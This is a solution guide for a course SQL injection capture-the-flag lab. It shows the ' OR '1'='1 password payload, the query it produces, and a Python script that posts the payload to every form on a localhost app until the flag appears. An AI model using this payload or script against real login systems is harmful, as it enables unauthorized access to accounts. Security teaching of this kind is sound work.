# CSSE142 SQL Injection Challenge – Solution Guide

## Problem description
You are presented with a webpage that shows **500 usernames**, each with a password input field and login button.

Your objective:
> **Find and exploit one vulnerable login form using SQL injection to reveal the flag.**

Only **one** of the login forms is vulnerable.

## Step 1: Open DevTools

Open your browser's developer tools:

- Chrome: `F12` or `Ctrl + Shift + I`
- Firefox: `F12` or `Ctrl + Shift + K`

Then go to the **Console** tab.

---

## Step 2: Find the Vulnerable Form

In the console, run:

```js
sessionStorage.getItem("vulnIndex")
'''
This returns a number like "237", which tells you which form is vulnerable to SQL injection.

---

## 3: Locate That Form

On the page, scroll down to the corresponding form:
User 237: <username> | Password: [___________] [Login]

This is the one you want to target.

---

## Step 4: Inject Payload

In the password box for that form, enter the classic SQL injection:
' OR '1'='1

sql
Copy
Edit

Then click the **Login** button.

This will cause the backend to run:

```
SELECT * FROM users WHERE username = 'xxx' AND password = '' OR '1'='1'
```

Which always evaluates to TRUE.

## Step 5: Capture the Flag
If successful, a JavaScript alert() will pop up with the flag.

## Optional: Brute Force with Script
If you couldn’t find the right form, you could automate it:

```
import requests

for i in range(1, 501):
    url = f"http://localhost:5000/login/{i}?vuln={i}"
    res = requests.post(url, data={"password": "' OR '1'='1"})
    if "FLAG" in res.text:
        print(f"Found vulnerable form at index {i}")
        break
```
